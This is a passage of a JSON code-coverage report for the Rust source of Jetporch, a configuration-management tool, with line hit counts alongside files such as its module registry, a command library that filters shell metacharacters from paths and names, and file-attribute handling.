=\u003e x.get_with(), \n            Task::Zypper(x)     =\u003e x.get_with(),\n        };\n    }\n\n    pub fn evaluate(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode) -\u003e Result\u003cEvaluatedTask, Arc\u003cTaskResponse\u003e\u003e {\n        // ADD NEW MODULES HERE, KEEP ALPHABETIZED BY NAME\n        return match self {\n            Task::Apt(x)        =\u003e x.evaluate(handle, request, tm),\n            Task::Assert(x)     =\u003e x.evaluate(handle, request, tm),\n            Task::Copy(x)       =\u003e x.evaluate(handle, request, tm),\n            Task::Debug(x)      =\u003e x.evaluate(handle, request, tm), \n            Task::Directory(x)  =\u003e x.evaluate(handle, request, tm), \n            Task::Dnf(x)        =\u003e x.evaluate(handle, request, tm),\n            Task::Echo(x)       =\u003e x.evaluate(handle, request, tm),\n            Task::External(x)   =\u003e x.evaluate(handle, request, tm),\n            Task::Facts(x)      =\u003e x.evaluate(handle, request, tm),\n            Task::Fail(x)       =\u003e x.evaluate(handle, request, tm),  \n            Task::File(x)       =\u003e x.evaluate(handle, request, tm), \n            Task::Git(x)        =\u003e x.evaluate(handle, request, tm),\n            Task::Group(x)      =\u003e x.evaluate(handle, request, tm),\n            Task::Homebrew(x)   =\u003e x.evaluate(handle, request, tm),\n            Task::Pacman(x)     =\u003e x.evaluate(handle, request, tm),\n            Task::Sd_Service(x) =\u003e x.evaluate(handle, request, tm),\n            Task::Set(x)        =\u003e x.evaluate(handle, request, tm),\n            Task::Shell(x)      =\u003e x.evaluate(handle, request, tm), \n            Task::Stat(x)       =\u003e x.evaluate(handle, request, tm),\n            Task::Template(x)   =\u003e x.evaluate(handle, request, tm), \n            Task::User(x)       =\u003e x.evaluate(handle, request, tm),\n            Task::Yum(x)        =\u003e x.evaluate(handle, request, tm), \n            Task::Zypper(x)     =\u003e x.evaluate(handle, request, tm), \n        };\n    }\n\n    // ==== END MODULE REGISTRY CONFIG ====\n\n    pub fn get_display_name(\u0026self) -\u003e String {\n        return match self.get_name() { Some(x) =\u003e x, _ =\u003e self.get_module()  }\n    }\n\n}\n\n\n\n\n","traces":[{"line":95,"address":[],"length":0,"stats":{"Line":0}},{"line":97,"address":[],"length":0,"stats":{"Line":0}},{"line":98,"address":[],"length":0,"stats":{"Line":0}},{"line":99,"address":[],"length":0,"stats":{"Line":0}},{"line":100,"address":[],"length":0,"stats":{"Line":0}},{"line":101,"address":[],"length":0,"stats":{"Line":0}},{"line":102,"address":[],"length":0,"stats":{"Line":0}},{"line":103,"address":[],"length":0,"stats":{"Line":0}},{"line":104,"address":[],"length":0,"stats":{"Line":0}},{"line":105,"address":[],"length":0,"stats":{"Line":0}},{"line":106,"address":[],"length":0,"stats":{"Line":0}},{"line":107,"address":[],"length":0,"stats":{"Line":0}},{"line":108,"address":[],"length":0,"stats":{"Line":0}},{"line":109,"address":[],"length":0,"stats":{"Line":0}},{"line":110,"address":[],"length":0,"stats":{"Line":0}},{"line":111,"address":[],"length":0,"stats":{"Line":0}},{"line":112,"address":[],"length":0,"stats":{"Line":0}},{"line":113,"address":[],"length":0,"stats":{"Line":0}},{"line":114,"address":[],"length":0,"stats":{"Line":0}},{"line":115,"address":[],"length":0,"stats":{"Line":0}},{"line":116,"address":[],"length":0,"stats":{"Line":0}},{"line":117,"address":[],"length":0,"stats":{"Line":0}},{"line":118,"address":[],"length":0,"stats":{"Line":0}},{"line":119,"address":[],"length":0,"stats":{"Line":0}},{"line":120,"address":[],"length":0,"stats":{"Line":0}},{"line":124,"address":[],"length":0,"stats":{"Line":0}},{"line":126,"address":[],"length":0,"stats":{"Line":0}},{"line":127,"address":[],"length":0,"stats":{"Line":0}},{"line":128,"address":[],"length":0,"stats":{"Line":0}},{"line":129,"address":[],"length":0,"stats":{"Line":0}},{"line":130,"address":[],"length":0,"stats":{"Line":0}},{"line":131,"address":[],"length":0,"stats":{"Line":0}},{"line":132,"address":[],"length":0,"stats":{"Line":0}},{"line":133,"address":[],"length":0,"stats":{"Line":0}},{"line":134,"address":[],"length":0,"stats":{"Line":0}},{"line":135,"address":[],"length":0,"stats":{"Line":0}},{"line":136,"address":[],"length":0,"stats":{"Line":0}},{"line":137,"address":[],"length":0,"stats":{"Line":0}},{"line":138,"address":[],"length":0,"stats":{"Line":0}},{"line":139,"address":[],"length":0,"stats":{"Line":0}},{"line":140,"address":[],"length":0,"stats":{"Line":0}},{"line":141,"address":[],"length":0,"stats":{"Line":0}},{"line":142,"address":[],"length":0,"stats":{"Line":0}},{"line":143,"address":[],"length":0,"stats":{"Line":0}},{"line":144,"address":[],"length":0,"stats":{"Line":0}},{"line":145,"address":[],"length":0,"stats":{"Line":0}},{"line":146,"address":[],"length":0,"stats":{"Line":0}},{"line":147,"address":[],"length":0,"stats":{"Line":0}},{"line":148,"address":[],"length":0,"stats":{"Line":0}},{"line":149,"address":[],"length":0,"stats":{"Line":0}},{"line":153,"address":[],"length":0,"stats":{"Line":0}},{"line":155,"address":[],"length":0,"stats":{"Line":0}},{"line":156,"address":[],"length":0,"stats":{"Line":0}},{"line":157,"address":[],"length":0,"stats":{"Line":0}},{"line":158,"address":[],"length":0,"stats":{"Line":0}},{"line":159,"address":[],"length":0,"stats":{"Line":0}},{"line":160,"address":[],"length":0,"stats":{"Line":0}},{"line":161,"address":[],"length":0,"stats":{"Line":0}},{"line":162,"address":[],"length":0,"stats":{"Line":0}},{"line":163,"address":[],"length":0,"stats":{"Line":0}},{"line":164,"address":[],"length":0,"stats":{"Line":0}},{"line":165,"address":[],"length":0,"stats":{"Line":0}},{"line":166,"address":[],"length":0,"stats":{"Line":0}},{"line":167,"address":[],"length":0,"stats":{"Line":0}},{"line":168,"address":[],"length":0,"stats":{"Line":0}},{"line":169,"address":[],"length":0,"stats":{"Line":0}},{"line":170,"address":[],"length":0,"stats":{"Line":0}},{"line":171,"address":[],"length":0,"stats":{"Line":0}},{"line":172,"address":[],"length":0,"stats":{"Line":0}},{"line":173,"address":[],"length":0,"stats":{"Line":0}},{"line":174,"address":[],"length":0,"stats":{"Line":0}},{"line":175,"address":[],"length":0,"stats":{"Line":0}},{"line":176,"address":[],"length":0,"stats":{"Line":0}},{"line":177,"address":[],"length":0,"stats":{"Line":0}},{"line":178,"address":[],"length":0,"stats":{"Line":0}},{"line":182,"address":[],"length":0,"stats":{"Line":0}},{"line":184,"address":[],"length":0,"stats":{"Line":0}},{"line":185,"address":[],"length":0,"stats":{"Line":0}},{"line":186,"address":[],"length":0,"stats":{"Line":0}},{"line":187,"address":[],"length":0,"stats":{"Line":0}},{"line":188,"address":[],"length":0,"stats":{"Line":0}},{"line":189,"address":[],"length":0,"stats":{"Line":0}},{"line":190,"address":[],"length":0,"stats":{"Line":0}},{"line":191,"address":[],"length":0,"stats":{"Line":0}},{"line":192,"address":[],"length":0,"stats":{"Line":0}},{"line":193,"address":[],"length":0,"stats":{"Line":0}},{"line":194,"address":[],"length":0,"stats":{"Line":0}},{"line":195,"address":[],"length":0,"stats":{"Line":0}},{"line":196,"address":[],"length":0,"stats":{"Line":0}},{"line":197,"address":[],"length":0,"stats":{"Line":0}},{"line":198,"address":[],"length":0,"stats":{"Line":0}},{"line":199,"address":[],"length":0,"stats":{"Line":0}},{"line":200,"address":[],"length":0,"stats":{"Line":0}},{"line":201,"address":[],"length":0,"stats":{"Line":0}},{"line":202,"address":[],"length":0,"stats":{"Line":0}},{"line":203,"address":[],"length":0,"stats":{"Line":0}},{"line":204,"address":[],"length":0,"stats":{"Line":0}},{"line":205,"address":[],"length":0,"stats":{"Line":0}},{"line":206,"address":[],"length":0,"stats":{"Line":0}},{"line":207,"address":[],"length":0,"stats":{"Line":0}},{"line":213,"address":[],"length":0,"stats":{"Line":0}},{"line":214,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":102},{"path":["/","Users","wings","projects","jetpack","src","registry","mod.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\npub mod list;\n\n","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","src","tasks","checksum.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse sha2::{Sha512, Digest};\n\npub fn sha512(data: \u0026String) -\u003e String {\n    let mut hasher = Sha512::new();\n    hasher.update(data.as_bytes());\n    let result = hasher.finalize();\n    format!(\"{result:x}\")\n}\n","traces":[{"line":19,"address":[],"length":0,"stats":{"Line":7}},{"line":20,"address":[],"length":0,"stats":{"Line":7}},{"line":21,"address":[],"length":0,"stats":{"Line":7}},{"line":22,"address":[],"length":0,"stats":{"Line":7}},{"line":23,"address":[],"length":0,"stats":{"Line":7}}],"covered":5,"coverable":5},{"path":["/","Users","wings","projects","jetpack","src","tasks","cmd_library.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\n// this is here to prevent typos in module code between Query \u0026 Modify \n// match legs. \n\nuse crate::inventory::hosts::HostOSType;\nuse crate::tasks::FileAttributesInput;\nuse crate::tasks::files::Recurse;\n\n// **IMPORTANT**\n//\n// all commands are responsible for screening their inputs within this file\n// it is **NOT** permissible to leave this up to the caller. Err on the side\n// of over-filtering!\n//\n// most filtering should occur in the module() evaluate code by choosing\n// the right template functions.\n//\n// any argument that allows spaces (such as paths) should be the *last*\n// command in any command sequence.\n\npub fn screen_path(path: \u0026String) -\u003e Result\u003cString,String\u003e {\n    // NOTE: this only checks paths used in commands\n    let path2 = path.trim().to_string();\n    let path3 = screen_general_input_strict(\u0026path2)?;\n    return Ok(path3.to_string());\n}\n\n// this filtering is applied to all shell arguments in the command library below (if not, it's an error)\n// but is automatically also applied to all template calls not marked _unsafe in the evaluate() stages\n// of modules. We run everything twice to prevent module coding errors.\n\npub fn screen_general_input_strict(input: \u0026String) -\u003e Result\u003cString,String\u003e {\n    let input2 = input.trim();\n    let bad = vec![ \";\", \"{\", \"}\", \"(\", \")\", \"\u003c\", \"\u003e\", \"\u0026\", \"*\", \"|\", \"=\", \"?\", \"[\", \"]\", \"$\", \"%\", \"`\"];\n\n    for invalid in bad.iter() {\n        if input2.find(invalid).is_some() {\n            return Err(format!(\"illegal characters found: {} ('{}')\", input2, invalid.to_string()));\n        }\n    }\n    return Ok(input2.to_string());\n}\n\n// a slightly lighter version of checking, that allows = signs and such\n// this is applied across all commands executed by the system, not just per-parameter checks\n// unless run_unsafe is used internally. It is assumed that all inputs going into this command\n// (parameters) are already sufficiently screened for things that can break shell commands and arguments\n// are already quoted.\n\npub fn screen_general_input_loose(input: \u0026String) -\u003e Result\u003cString,String\u003e {\n    let input2 = input.trim();\n    let bad = vec![ \";\", \"\u003c\", \"\u003e\", \"\u0026\", \"*\", \"?\", \"{\", \"}\", \"[\", \"]\", \"$\", \"`\"];\n    for invalid in bad.iter() {\n        if input2.find(invalid).is_some() {\n            return Err(format!(\"illegal characters detected: {} ('{}')\", input2, invalid.to_string()));\n        }\n    }\n    return Ok(input2.to_string());\n}\n\n// require that octal inputs be ... octal\n\npub fn screen_mode(mode: \u0026String) -\u003e Result\u003cString,String\u003e {\n    if FileAttributesInput::is_octal_string(\u0026mode) {\n        return Ok(mode.clone());\n    } else {\n        return Err(format!(\"not an octal string: {}\", mode));\n    }\n}\n\npub fn get_mode_command(os_type: HostOSType, untrusted_path: \u0026String) -\u003e Result\u003cString,String\u003e  {\n    let path = screen_path(untrusted_path)?;\n    return match os_type {\n        HostOSType::Linux =\u003e Ok(format!(\"stat --format '%a' '{}'\", path)),\n        HostOSType::MacOS =\u003e Ok(format!(\"stat -f '%A' '{}'\", path)),\n    }\n}\n\npub fn get_sha512_command(os_type: HostOSType, untrusted_path: \u0026String) -\u003e Result\u003cString,String\u003e  {\n    let path = screen_path(untrusted_path)?;\n    return match os_type {\n        HostOSType::Linux =\u003e Ok(format!(\"sha512sum '{}'\", path)),\n        HostOSType::MacOS =\u003e Ok(format!(\"shasum -b -a 512 '{}'\", path)),\n    }\n}\n\npub fn get_ownership_command(_os_type: HostOSType, untrusted_path: \u0026String) -\u003e Result\u003cString,String\u003e  {\n    let path = screen_path(untrusted_path)?;\n    return Ok(format!(\"ls -ld '{}'\", path));\n}\n\npub fn get_is_directory_command(_os_type: HostOSType, untrusted_path: \u0026String) -\u003e Result\u003cString,String\u003e  {\n    let path = screen_path(untrusted_path)?;\n    return Ok(format!(\"ls -ld '{}'\", path));\n}\n\npub fn get_touch_command(_os_type: HostOSType, untrusted_path: \u0026String) -\u003e Result\u003cString,String\u003e  {\n    let path = screen_path(untrusted_path)?;\n    return Ok(format!(\"touch '{}'\", path));\n}\n\npub fn get_create_directory_command(_os_type: HostOSType, untrusted_path: \u0026String) -\u003e Result\u003cString,String\u003e  {\n    let path = screen_path(untrusted_path)?;\n    return Ok(format!(\"mkdir -p '{}'\", path));\n}\n\npub fn get_delete_file_command(_os_type: HostOSType, untrusted_path: \u0026String) -\u003e Result\u003cString,String\u003e  {\n    let path = screen_path(untrusted_path)?;\n    return Ok(format!(\"rm -f '{}'\", path));\n}\n\npub fn get_delete_directory_command(_os_type: HostOSType, untrusted_path: \u0026String, recurse: Recurse) -\u003e Result\u003cString,String\u003e  {\n    let path = screen_path(untrusted_path)?;\n    match recurse {\n        Recurse::No  =\u003e { return Ok(format!(\"rmdir '{}'\", path));  },\n        Recurse::Yes =\u003e { return Ok(format!(\"rm -rf '{}'\", path)); }\n    }\n}\n\npub fn set_owner_command(_os_type: HostOSType, untrusted_path: \u0026String, untrusted_owner: \u0026String, recurse: Recurse) -\u003e Result\u003cString,String\u003e {\n    let path = screen_path(untrusted_path)?;\n    let owner = screen_general_input_strict(untrusted_owner)?;\n    match recurse {\n        Recurse::No   =\u003e { return Ok(format!(\"chown '{}' '{}'\", owner, path));    },\n        Recurse::Yes  =\u003e { return Ok(format!(\"chown -R '{}' '{}'\", owner, path)); }\n    }\n}\n\npub fn set_group_command(_os_type: HostOSType, untrusted_path: \u0026String, untrusted_group: \u0026String, recurse: Recurse) -\u003e Result\u003cString,String\u003e {\n    let path = screen_path(untrusted_path)?;\n    let group = screen_general_input_strict(untrusted_group)?;\n    match recurse {\n        Recurse::No   =\u003e { return Ok(format!(\"chgrp '{}' '{}'\", group, path));    },\n        Recurse::Yes  =\u003e { return Ok(format!(\"chgrp -R '{}' '{}'\", group, path)); }\n    }\n}\n\npub fn set_mode_command(_os_type: HostOSType, untrusted_path: \u0026String, untrusted_mode: \u0026String, recurse: Recurse) -\u003e Result\u003cString,String\u003e {\n    // mode generally does not have to be screened but someone could call a command directly without going through FileAttributes\n    // so let's be thorough.\n    let path = screen_path(untrusted_path)?;\n    let mode = screen_mode(untrusted_mode)?;\n    match recurse {\n        Recurse::No  =\u003e { return Ok(format!(\"chmod '{}' '{}'\", mode, path));    },\n        Recurse::Yes =\u003e { return Ok(format!(\"chmod -R '{}' '{}'\", mode, path)); }\n    }\n}\n\npub fn get_arch_command(os_type: HostOSType) -\u003e Result\u003cString,String\u003e {\n    match os_type {\n        _ =\u003e { return Ok(String::from(\"uname -m\")) },\n    }\n}\n","traces":[{"line":36,"address":[],"length":0,"stats":{"Line":27}},{"line":38,"address":[],"length":0,"stats":{"Line":27}},{"line":39,"address":[],"length":0,"stats":{"Line":54}},{"line":40,"address":[],"length":0,"stats":{"Line":0}},{"line":47,"address":[],"length":0,"stats":{"Line":50}},{"line":48,"address":[],"length":0,"stats":{"Line":50}},{"line":49,"address":[],"length":0,"stats":{"Line":50}},{"line":51,"address":[],"length":0,"stats":{"Line":687}},{"line":52,"address":[],"length":0,"stats":{"Line":637}},{"line":53,"address":[],"length":0,"stats":{"Line":24}},{"line":56,"address":[],"length":0,"stats":{"Line":26}},{"line":65,"address":[],"length":0,"stats":{"Line":14}},{"line":66,"address":[],"length":0,"stats":{"Line":14}},{"line":67,"address":[],"length":0,"stats":{"Line":14}},{"line":68,"address":[],"length":0,"stats":{"Line":116}},{"line":69,"address":[],"length":0,"stats":{"Line":102}},{"line":70,"address":[],"length":0,"stats":{"Line":12}},{"line":73,"address":[],"length":0,"stats":{"Line":2}},{"line":78,"address":[],"length":0,"stats":{"Line":19}},{"line":79,"address":[],"length":0,"stats":{"Line":19}},{"line":80,"address":[],"length":0,"stats":{"Line":10}},{"line":82,"address":[],"length":0,"stats":{"Line":9}},{"line":86,"address":[],"length":0,"stats":{"Line":2}},{"line":87,"address":[],"length":0,"stats":{"Line":4}},{"line":88,"address":[],"length":0,"stats":{"Line":0}},{"line":89,"address":[],"length":0,"stats":{"Line":1}},{"line":90,"address":[],"length":0,"stats":{"Line":1}},{"line":94,"address":[],"length":0,"stats":{"Line":2}},{"line":95,"address":[],"length":0,"stats":{"Line":4}},{"line":96,"address":[],"length":0,"stats":{"Line":0}},{"line":97,"address":[],"length":0,"stats":{"Line":1}},{"line":98,"address":[],"length":0,"stats":{"Line":1}},{"line":102,"address":[],"length":0,"stats":{"Line":1}},{"line":103,"address":[],"length":0,"stats":{"Line":2}},{"line":104,"address":[],"length":0,"stats":{"Line":0}},{"line":107,"address":[],"length":0,"stats":{"Line":1}},{"line":108,"address":[],"length":0,"stats":{"Line":2}},{"line":109,"address":[],"length":0,"stats":{"Line":0}},{"line":112,"address":[],"length":0,"stats":{"Line":1}},{"line":113,"address":[],"length":0,"stats":{"Line":2}},{"line":114,"address":[],"length":0,"stats":{"Line":0}},{"line":117,"address":[],"length":0,"stats":{"Line":1}},{"line":118,"address":[],"length":0,"stats":{"Line":2}},{"line":119,"address":[],"length":0,"stats":{"Line":0}},{"line":122,"address":[],"length":0,"stats":{"Line":1}},{"line":123,"address":[],"length":0,"stats":{"Line":2}},{"line":124,"address":[],"length":0,"stats":{"Line":0}},{"line":127,"address":[],"length":0,"stats":{"Line":2}},{"line":128,"address":[],"length":0,"stats":{"Line":4}},{"line":129,"address":[],"length":0,"stats":{"Line":0}},{"line":130,"address":[],"length":0,"stats":{"Line":1}},{"line":131,"address":[],"length":0,"stats":{"Line":1}},{"line":135,"address":[],"length":0,"stats":{"Line":2}},{"line":136,"address":[],"length":0,"stats":{"Line":4}},{"line":137,"address":[],"length":0,"stats":{"Line":2}},{"line":138,"address":[],"length":0,"stats":{"Line":0}},{"line":139,"address":[],"length":0,"stats":{"Line":1}},{"line":140,"address":[],"length":0,"stats":{"Line":1}},{"line":144,"address":[],"length":0,"stats":{"Line":2}},{"line":145,"address":[],"length":0,"stats":{"Line":4}},{"line":146,"address":[],"length":0,"stats":{"Line":2}},{"line":147,"address":[],"length":0,"stats":{"Line":0}},{"line":148,"address":[],"length":0,"stats":{"Line":1}},{"line":149,"address":[],"length":0,"stats":{"Line":1}},{"line":153,"address":[],"length":0,"stats":{"Line":2}},{"line":156,"address":[],"length":0,"stats":{"Line":4}},{"line":157,"address":[],"length":0,"stats":{"Line":2}},{"line":158,"address":[],"length":0,"stats":{"Line":0}},{"line":159,"address":[],"length":0,"stats":{"Line":1}},{"line":160,"address":[],"length":0,"stats":{"Line":1}},{"line":164,"address":[],"length":0,"stats":{"Line":2}},{"line":165,"address":[],"length":0,"stats":{"Line":2}},{"line":166,"address":[],"length":0,"stats":{"Line":2}}],"covered":61,"coverable":73},{"path":["/","Users","wings","projects","jetpack","src","tasks","common.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::handle::handle::TaskHandle;\nuse crate::tasks::request::TaskRequest;\nuse crate::tasks::response::TaskResponse;\nuse crate::tasks::logic::{PreLogicInput,PreLogicEvaluated,PostLogicEvaluated};\nuse std::sync::Arc;\nuse crate::tasks::TemplateMode;\n\npub struct EvaluatedTask {\n    pub action: Arc\u003cdyn IsAction\u003e,\n    pub with: Arc\u003cOption\u003cPreLogicEvaluated\u003e\u003e,\n    pub and: Arc\u003cOption\u003cPostLogicEvaluated\u003e\u003e\n}\n\npub trait IsTask : Send + Sync { \n\n    fn get_module(\u0026self) -\u003e String;\n    fn get_name(\u0026self) -\u003e Option\u003cString\u003e;\n    fn get_with(\u0026self) -\u003e Option\u003cPreLogicInput\u003e;\n    \n    fn evaluate(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode) -\u003e Result\u003cEvaluatedTask, Arc\u003cTaskResponse\u003e\u003e;\n\n    fn get_display_name(\u0026self) -\u003e String {\n        return match self.get_name() {\n            Some(x) =\u003e x,\n            _ =\u003e self.get_module()\n        }\n    }\n\n}\n\npub trait IsAction : Send + Sync {\n\n    fn dispatch(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e, Arc\u003cTaskResponse\u003e\u003e;\n}\n\n","traces":[{"line":38,"address":[],"length":0,"stats":{"Line":3}},{"line":39,"address":[],"length":0,"stats":{"Line":3}},{"line":40,"address":[],"length":0,"stats":{"Line":2}},{"line":41,"address":[],"length":0,"stats":{"Line":1}}],"covered":4,"coverable":4},{"path":["/","Users","wings","projects","jetpack","src","tasks","fields.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse std::vec::Vec;\n\n// this is to prevent typos in module code between Query \u0026 Modify \n// match legs vs using strings\n\n// KEEP THESE ALPHABETIZED\n\n#[derive(Eq,Hash,PartialEq,Clone,Copy,Debug)]\npub enum Field {\n    Branch,\n    Content,\n    Disable,\n    Enable,\n    Gecos,\n    Gid,\n    Group,\n    Groups,\n    Mode,\n    Owner,\n    Restart,\n    Shell,\n    Start,\n    Stop,\n    Uid,\n    Users,\n    Version,\n}\n\nimpl Field {\n    pub fn all_file_attributes() -\u003e Vec\u003cField\u003e {\n        let mut result : Vec\u003cField\u003e = Vec::new();\n        result.push(Field::Owner);\n        result.push(Field::Group);\n        result.push(Field::Mode);\n        return result; \n    }\n}\n","traces":[{"line":46,"address":[],"length":0,"stats":{"Line":1}},{"line":47,"address":[],"length":0,"stats":{"Line":1}},{"line":48,"address":[],"length":0,"stats":{"Line":1}},{"line":49,"address":[],"length":0,"stats":{"Line":1}},{"line":50,"address":[],"length":0,"stats":{"Line":1}},{"line":51,"address":[],"length":0,"stats":{"Line":1}}],"covered":6,"coverable":6},{"path":["/","Users","wings","projects","jetpack","src","tasks","files.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::handle::handle::TaskHandle;\nuse crate::tasks::request::TaskRequest;\nuse crate::tasks::response::TaskResponse;\nuse crate::tasks::TemplateMode;\nuse std::sync::Arc;\nuse serde::Deserialize;\n\n// this is storage behind all 'and' and 'with' statements in the program, which\n// are mostly implemented in task_fsm\n\n#[derive(Deserialize,Debug)]\n#[serde(deny_unknown_fields)]\npub struct FileAttributesInput {\n    pub owner: Option\u003cString\u003e,\n    pub group: Option\u003cString\u003e,\n    pub mode: Option\u003cString\u003e\n}\n\n#[derive(Deserialize,Debug)]\n#[serde(deny_unknown_fields)]\npub struct FileAttributesEvaluated {\n    pub owner: Option\u003cString\u003e,\n    pub group: Option\u003cString\u003e,\n    pub mode: Option\u003cString\u003e\n}\n\n#[derive(Deserialize,Debug,Copy,Clone,PartialEq)]\npub enum Recurse {\n    No,\n    Yes\n}\n\nimpl FileAttributesInput {\n\n    // given an octal string, like 0o755 or 755, return the numeric value\n    pub fn is_octal_string(mode: \u0026String) -\u003e bool {\n        let octal_no_prefix = str::replace(\u0026mode, \"0o\", \"\");\n        // this error should be screened out by template() below already but return types are important.\n        return match i32::from_str_radix(\u0026octal_no_prefix, 8) {\n            Ok(_x) =\u003e true,\n            Err(_y) =\u003e false \n        }\n    }\n\n    // given an octal string, like 0o755 or 755, return the numeric value\n    /*\n    fn octal_string_to_number(response: \u0026Arc\u003cResponse\u003e, request: \u0026Arc\u003cTaskRequest\u003e, mode: \u0026String) -\u003e Result\u003ci32,Arc\u003cTaskResponse\u003e\u003e {\n        let octal_no_prefix = str::replace(\u0026mode, \"0o\", \"\");\n        // this error should be screened out by template() below already but return types are important.\n        return match i32::from_str_radix(\u0026octal_no_prefix, 8) {\n            Ok(x) =\u003e Ok(x),\n            Err(y) =\u003e { return Err(response.is_failed(\u0026request, \u0026format!(\"invalid octal value extracted from mode, was {}, {:?}\", octal_no_prefix,y))); }\n        }\n    }\n    */\n\n    // template **all** the fields in FileAttributesInput fields, checking values and returning errors as needed\n    pub fn template(handle: \u0026TaskHandle, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode, input: \u0026Option\u003cSelf\u003e) -\u003e Result\u003cOption\u003cFileAttributesEvaluated\u003e,Arc\u003cTaskResponse\u003e\u003e {\n\n        if tm == TemplateMode::Off {\n            return Ok(None);\n        }\n\n        if input.is_none() {\n            return Ok(None);\n        }\n        \n        let input2 = input.as_ref().unwrap();\n        let final_mode_value : Option\u003cString\u003e;\n\n        // owner \u0026 group is easy but mode is complex\n        // makes sure mode is octal and not accidentally enter decimal or hex or leave off the octal prefix\n        // as the input field is a YAML string unwanted conversion shouldn't happen but we want to be strict with other tools\n        // that might read the file and encourage users to use YAML-spec required input here even though YAML isn't doing\n        // the evaluation.\n\n        if input2.mode.is_some()  { \n            let mode_input = input2.mode.as_ref().unwrap();\n            let templated_mode_string = handle.template.string(request, tm, \u0026String::from(\"mode\"), \u0026mode_input)?;\n            if ! templated_mode_string.starts_with(\"0o\") {\n                return Err(handle.response.is_failed(request, \u0026String::from(\n                    format!(\"(a) field (mode) must have an octal-prefixed value of form 0o755, was {}\", templated_mode_string)\n                )));\n            }\n\n            let octal_no_prefix = str::replace(\u0026templated_mode_string, \"0o\", \"\");\n\n            // we may have gotten an 0oExampleJunkString which is still not neccessarily valid - so check if it's a number\n            // and return the value with the 0o stripped off, for easier use elsewhere\n            let decimal_mode = i32::from_str_radix(\u0026octal_no_prefix, 8);\n            match decimal_mode {\n                Ok(_x) =\u003e { \n                    final_mode_value = Some(octal_no_prefix);\n                },\n                Err(_y) =\u003e { \n                    return Err(handle.response.is_failed(request, \u0026String::from(\n                        format!(\"(b) field (mode) must have an octal-prefixed value of form 0o755, was {}\", templated_mode_string)\n                    )));\n                }\n            };\n        } else {\n            // mode was left off in the automation content\n            final_mode_value = None;\n        }\n\n        return Ok(Some(FileAttributesEvaluated {\n            owner:         handle.template.string_option_no_spaces(request, tm, \u0026String::from(\"owner\"), \u0026input2.owner)?,\n            group:         handle.template.string_option_no_spaces(request, tm, \u0026String::from(\"group\"), \u0026input2.group)?,\n            mode:          final_mode_value,\n        }));\n    }\n}\n\n\nimpl FileAttributesEvaluated {\n\n    // if the action 